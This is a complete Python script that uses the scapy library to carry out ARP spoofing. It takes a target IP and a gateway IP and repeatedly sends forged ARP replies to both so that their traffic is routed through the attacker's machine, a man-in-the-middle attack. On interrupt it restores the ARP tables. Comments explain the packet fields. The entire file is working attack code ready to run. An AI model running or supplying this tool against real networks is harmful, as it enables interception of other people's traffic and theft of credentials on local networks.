import scapy.all as scapy
import time
import argparse
#op= redirects flow of packet, sent as arp response
## pdst = ip packet target
### hwdst = mac address of target
#### psrc = spoof_arp

def options():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t","--target", dest="target", help="Needs target ip")
    parse.add_argument("-g","--gateway", dest="gateway", help="Needs gateway ip")
    options= parse.parse_args()
    return options

def scan(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac= scan(target_ip)
    packet =scapy.ARP(op=2, pdst=target_ip ,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(des_ip, source_ip):
    des_mac= scan(des_ip)
    source_mac=scan(source_ip)
    packet=scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=source_ip, hwsrc=source_mac )
    scapy.send(packet, count=4, verbose=False)


options= options()
packet_number = 0
print("ARP spoofing on:", options.target,"\n")
try:
    while True:
        spoof(options.target,options.gateway)
        spoof(options.gateway, options.target)
        packet_number= packet_number +2
        print("\rNumber of packages sent: " + str(packet_number), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nEnding spoof..... Restoring ARP tables")
    restore(options.target,options.gateway)
    restore(options.gateway,options.target)
